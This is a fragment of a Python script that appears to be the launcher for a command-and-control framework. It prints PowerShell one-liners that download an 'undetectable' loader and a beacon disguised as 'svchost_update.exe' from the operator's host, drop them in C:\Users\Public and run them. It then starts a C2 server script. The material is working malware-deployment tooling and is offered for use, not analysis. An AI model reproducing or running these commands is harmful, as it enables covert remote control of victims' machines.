...
def _phase0_launch():
    ...
    print(f"  {WHITE}  # TCP shell only (beacon already running):{RST}")
    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/shell/ghost_fud.exe\" -OutFile \"C:\\Users\\Public\\ghost_loader.exe\"; Start-Process \"C:\\Users\\Public\\ghost_loader.exe\"{RST}")
    print()
    print(f"  {WHITE}  # Full re-deploy (kills beacon + restarts both):{RST}")
    print(f"  {WHITE}  taskkill /F /IM svchost_update.exe 2>$null | Out-Null; iwr \"http://{my_ip}:8890/shell/ghost_fud.exe\" -OutFile \"C:\\Users\\Public\\ghost_loader.exe\"; iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\svchost_update.exe\"; Start-Process \"C:\\Users\\Public\\ghost_loader.exe\"; Start-Process \"C:\\Users\\Public\\svchost_update.exe\"{RST}")
    print(f"  {RED}{BOLD}  └────────────────────────────────────────────────────────────────────┘{RST}")
    print()
    print()

    c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
    # Launch in a new console window (CREATE_NEW_CONSOLE) so input() in interact works
    subprocess.Popen(
        [sys.executable, c2_v2],
        cwd=ROOT,
